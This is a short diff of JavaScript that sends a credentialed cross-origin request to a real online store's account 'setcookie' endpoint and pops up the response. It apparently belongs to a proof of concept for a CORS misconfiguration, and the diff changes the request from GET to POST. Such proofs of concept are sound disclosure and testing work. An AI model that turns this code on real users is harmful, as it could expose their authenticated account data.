@@ -9,7 +9,7 @@
                         document.getElementById("emo").innerHTML = alert(this.responseText);
             }
          };
-         xhttp.open("GET", "https://store.oppo.com/id/customer/account/setcookie", true);
+         xhttp.open("POST", "https://store.oppo.com/id/customer/account/setcookie", true);
          xhttp.withCredentials = true;
          xhttp.send();
          }
